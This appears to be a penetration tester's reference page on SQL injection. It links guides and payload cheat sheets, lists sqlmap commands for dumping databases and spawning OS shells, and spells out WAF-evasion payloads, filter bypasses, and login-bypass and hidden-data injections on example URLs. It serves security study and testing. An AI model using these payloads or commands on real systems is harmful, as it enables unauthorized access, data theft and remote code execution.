# SQL Injection

## Guides and Resources

{% tabs %}
{% tab title="Guides" %}
* [https://www.sqlinjection.net/](https://www.sqlinjection.net/)
* [https://owasp.org/www-community/attacks/SQL\_Injection](https://owasp.org/www-community/attacks/SQL\_Injection)
* [https://owasp.org/www-community/Injection\_Flaws](https://owasp.org/www-community/Injection\_Flaws)
* [http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html](http://securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html)
* [https://www.w3schools.com/sql/default.asp](https://www.w3schools.com/sql/default.asp)
* [https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)
* [https://cheatsheetseries.owasp.org/cheatsheets/Injection\_Prevention\_Cheat\_Sheet.html#sql-injection](https://cheatsheetseries.owasp.org/cheatsheets/Injection\_Prevention\_Cheat\_Sheet.html#sql-injection)
* [https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html)
* [https://pentestbook.six2dez.com/enumeration/web/sqli](https://pentestbook.six2dez.com/enumeration/web/sqli)
* [https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet)
* [https://www.pcwdld.com/sql-cheat-sheet](https://www.pcwdld.com/sql-cheat-sheet)
* _SQL Injection Vulnerabilities - Bug Bounty Hunting Essentials, pg 29_
{% endtab %}

{% tab title="Payload Cheatsheets" %}
* [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
* [https://github.com/payloadbox/sql-injection-payload-list/](https://github.com/payloadbox/sql-injection-payload-list/)
* [https://websec.ca/kb/sql\_injection](https://websec.ca/kb/sql\_injection)
* [http://pentestmonkey.net/category/cheat-sheet/sql-injection](http://pentestmonkey.net/category/cheat-sheet/sql-injection)
* [https://www.codecademy.com/articles/sql-commands](https://www.codecademy.com/articles/sql-commands)
{% endtab %}
{% endtabs %}

{% content-ref url="sql-tips-and-tricks.md" %}
[sql-tips-and-tricks.md](sql-tips-and-tricks.md)
{% endcontent-ref %}

## ****[**SQLmap**](https://github.com/sqlmapproject/sqlmap)  **** &#x20;

SQL Injection tool that can spawn a meterpreter or VNC session back to attacker. Can return a decent number of false positives. Always verify. If you do not specify a value, SQLmap will attempt all by default

{% tabs %}
{% tab title="Guides and Resources" %}
* [SQLMate](https://github.com/s0md3v/sqlmate) - Companion tool for SQLMap
  * &#x20;Maps out and locates admin panel
  * Query dorking for finding targets
  * hash lookup
* [https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/)
* [https://github.com/sqlmapproject/sqlmap/wiki/Usage](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
* __[https://www.binarytides.com/sqlmap-hacking-tutorial/](https://www.binarytides.com/sqlmap-hacking-tutorial/)
* [https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423](https://forum.bugcrowd.com/t/sqlmap-tamper-scripts-sql-injection-and-waf-bypass/423)
* [https://tryhackme.com/room/sqlmap](https://tryhackme.com/room/sqlmap)
* _RTFM: SQLMap - pg. 71_
* _Operator Handbook: SQLMap - pg. 284_
{% endtab %}

{% tab title="Config/help cmds" %}
Specify the database type if not SQL

```
--dbms=[db type]
```

If you need to test and authenticated SQL injection, log into website via a browserand grab the cookie (pull from burp suite)

```
--data=[COOKIE]
```

Help

```
# sqlmap --wizard
```


{% endtab %}

{% tab title="Cmds - GET" %}
### Commands GET parameter - injection passed in the URL itself

Test if sql inject is valid (will return banner on success)

```
# sqlmap -u "http://domain.com?user=test&pass=test" -b
```

Retrieve a database username

```
# sqlmap -u "http://domain.com?user=test&pass=test" --current-user
```

Crawl target

```
sqlmap -u http://10.10.10.10 --crawl=1
```

Dump Database

```
sqlmap -u http://10.10.10.10 --dbms=mysql --dump
```

Spawn interactive shell

```
# sqlmap -u "http://domain.com?user=test&pass=test" --os-shell
```

WAF bypass and shell setup

```
# sqlmap -u http://10.11.0.22/debug.php?id=1 -p "id" --dbms=mysql --os-shell
```
{% endtab %}

{% tab title="Cmds - POST" %}
### Commands POST parameter - injection passed in the data section

Test if sql inject is valid (will return banner on success)

```
# sqlmap -u “http://domain.com” --data="user=test&pass=test" -b
```
{% endtab %}
{% endtabs %}

<details>

<summary>SQLmap with Burp</summary>

* Start SQLmap API on your kali box while Burp Proxy Pro can be runnign anywhere
* When Burp finds an SQL injection, it will connect to SQLmap's running API to automaticallu attack the vulnerable parameters.
* Start SQLmap API
  * \# cd /opt/sqlmap
  * \# python sqlmapapi.py -s \[ip] -p \[port]

</details>

{% embed url="https://youtu.be/2YD4vygeghM" %}

## Other Tools

<details>

<summary>Other Tools</summary>

* [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) - A PowerShell Toolkit for Attacking SQL Server
  * [https://github.com/NetSPI/PowerUpSQL/wiki](https://github.com/NetSPI/PowerUpSQL/wiki)
  * [https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
* [**SQLninja**](http://sqlninja.sourceforge.net/)****
  * [https://www.jedge.com/wordpress/sqlninja-sql-injection/](https://www.jedge.com/wordpress/sqlninja-sql-injection/)
  * Great for evading IDS and uploading shells
  * Often times IDS will either recognize SQLmap OR SQLninja but not both
  * With SQLninja you must specify the vulnerable variable to inject.
  * Takes more to set up with manipulation of the config file.
* ****[**NOSQLmap**](https://github.com/codingo/NoSQLMap)****
  * Used for NOSQL databases
* [https://github.com/torque59/Nosql-Exploitation-Framework](https://github.com/torque59/Nosql-Exploitation-Framework)
* [https://github.com/Charlie-belmer/nosqli](https://github.com/Charlie-belmer/nosqli)
* [https://github.com/FSecureLABS/N1QLMap](https://github.com/FSecureLABS/N1QLMap)
* [https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md](https://github.com/daffainfo/AllAboutBugBounty/blob/master/NoSQL%20Injection.md)
* [DSSS](https://github.com/stamparm/DSSS) - Damn Small SQLi Scanner is a fully functional [SQL injection](https://en.wikipedia.org/wiki/SQL\_injection) vulnerability scanner (supporting GET and POST parameters) written in under 100 lines of code.
* [https://github.com/the-robot/sqliv](https://github.com/the-robot/sqliv)
* [Blisqy](https://github.com/JohnTroony/Blisqy) - Exploit Time-based blind-SQL injection in HTTP-Headers (MySQL/MariaDB).
* [https://github.com/youngyangyang04/NoSQLAttack](https://github.com/youngyangyang04/NoSQLAttack) - **A SQLi vulnerability scanner for mongoDB**
* [https://github.com/WhitewidowScanner/whitewidow](https://github.com/WhitewidowScanner/whitewidow) - **Another SQL vulnerability scanner**

</details>

## **SQL Basics**

{% content-ref url="sql-methodology.md" %}
[sql-methodology.md](sql-methodology.md)
{% endcontent-ref %}

## Attack Techniques

<details>

<summary>Filter evasion</summary>

* Many applications use web application firewalls (WAF) to help protect against any kind of SQL injection vulnerability. The only problem is that WAFs only look for certain words, characters, or patterns, meaning certain special characters used in combination can be used to evade WAF filter protection.
* For example, a very basic WAF may filter out specific SQL keywords such as `OR`, `SELECT`, `UNION` or `WHERE` to prevent them from being used in SQL injection attacks.
* **Methods**
  * **Capitalization** - If the WAF's filter, like the one described above, is implemented poorly, then there may be ways to evade it by using variations of the word being filtered out. The most straightforward example is where we can bypass the filter by capitalizing some letters in the keyword, like this:
    * &#x20;`Or`, `SeLeCt`, `UNioN` and `wHEre`.
  * **URL Encoding** - In cases where the query forms part of a URL, URL encoding may be a viable option for evading the filter. For example `%55` is ‘U’ and `%53` is ‘S’. The WAF may not identify these encoded characters, and may send them to the server which decodes and processes them as the intended keywords.
  * **Multi-line Comments** -  the use of multi-line comments, such as `“/*”` and `“*/”`, may cause the WAF filter to miss the keywords. MySQL will read the content between the two comment lines and execute it as SQL, whereas the DBMS may not flag it up.
    * /\*!%55NiOn\*/ /\*!%53eLEct\*//\*\*//\*!12345UNION SELECT\*//\*\*//\*\*//\*!50000UNION SELECT\*//\*\*//\*\*/UNION/\*\*//\*!50000SELECT\*//\*\*/
    * The ‘+’ can be used to build an injection query without the use of quotes.\
      `+union+distinct+select++union+distinctROW+select+`
  * **Inline Comments** - To bypass certain filters, you can abuse the inline comment system within MySQL using #.
    * `+#uNiOn+#sEleCt`
  * **Reverse Function** - To bypass a filter looking for certain strings, you can use the REVERSE function which will evaluate the correct way around at run time. However, when going through the filter, it will be seen as ‘noinu’ instead of ‘union’.
    * `REVERSE('noinu')+REVERSE('tceles')`
  * **String Splitting** - You can split strings within the query to bypass various filters. MySQL will still execute them as keywords.
    * `un?+un/**/ion+se/**/lect+`



</details>

<details>

<summary>String Concatenation</summary>

An input field may restrict the usage of certain datatypes and/or words/punctuation. This can make the exploitation of SQL injection vulnerabilities a little bit more difficult. However, two functions can be used in conjunction to bypass filters such as these:`CHAR()` and `CONCAT()`.

#### Syntax & examples

* Within MySQL, you have to use quotation marks to input a string into a statement. However, with the use of string functions and encoding methods, you can get past this hurdle.
* To concatenate various strings inside a statement, the MySQL function `CONCAT` is available.
  * `CONCAT(str1, str2, str3)`
  * `SELECT CONCAT(login, email) FROM users`
* Another way to create strings without the use of quotes is the MySQL's `CHAR` function, which returns a character related to the integer passed to it. For example, `CHAR(75)` returns K.\
  `CHAR` and `CONCAT` are often used together to create full sets of strings which bypass specific string filtering. This means you don't need quotation marks in the query.
  * `SELECT CONCAT(CHAR(77),CHAR(76),CHAR(75))`
  * This will select data from a database that is of ‘MLK’.
* Encoding methods are another way to manipulate strings.\
  Strings can be encoded into their Hex values either by passing a hex value or using the `HEX()` function.
* For example, the string 'password' can be passed to an SQL statement like this: `SELECT 0x70617373776f726`

</details>

<details>

<summary>Retrieve Hidden Data</summary>

* When retrieving items from a database via an SQL query, some results may be filtered with a restriction clause at the end of the of the query&#x20;
* In a vulnerable parameter, we can insert ‘--’ which is the SQL code for a comment. This will “comment out” the rest of the query, there for removing any restrictions placed on it.
* Example: &#x20;
  * https://insecure-website.com/products?category=Gifts
  * Query made by this URL:`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`&#x20;
  * URL with added comment attack: https://insecure-website.com/products?category=Gifts'--
    * Resulted query:`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
  * Expanding URL to show everything&#x20;
    * https://insecure-website.com/products?category=Gifts'+OR+1=1--
    * &#x20;Resulted query: `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
*  [https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

</details>

<details>

<summary>Subvert App Logic/Login Bypass</summary>

* When an application checks login credentials, it submits in a query, usually with the fields of a username and password. If the query returns with the user details, the login is successful.
* One way of bypassing the login requirement of the password, is to comment out the part of the query, after the username
* Example
  * Original login query:\
    &#x20;◇ `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`\
    • Query with bypassed password field\
    &#x20;◇ `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
* [https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)
* [http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html](http://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html)
* [https://portswigger.net/web-security/sql-injection/lab-login-bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

</details>

## **Manual Injection Methodology**

{% content-ref url="manual-injection-methodology.md" %}
[manual-injection-methodology.md](manual-injection-methodology.md)
{% endcontent-ref %}
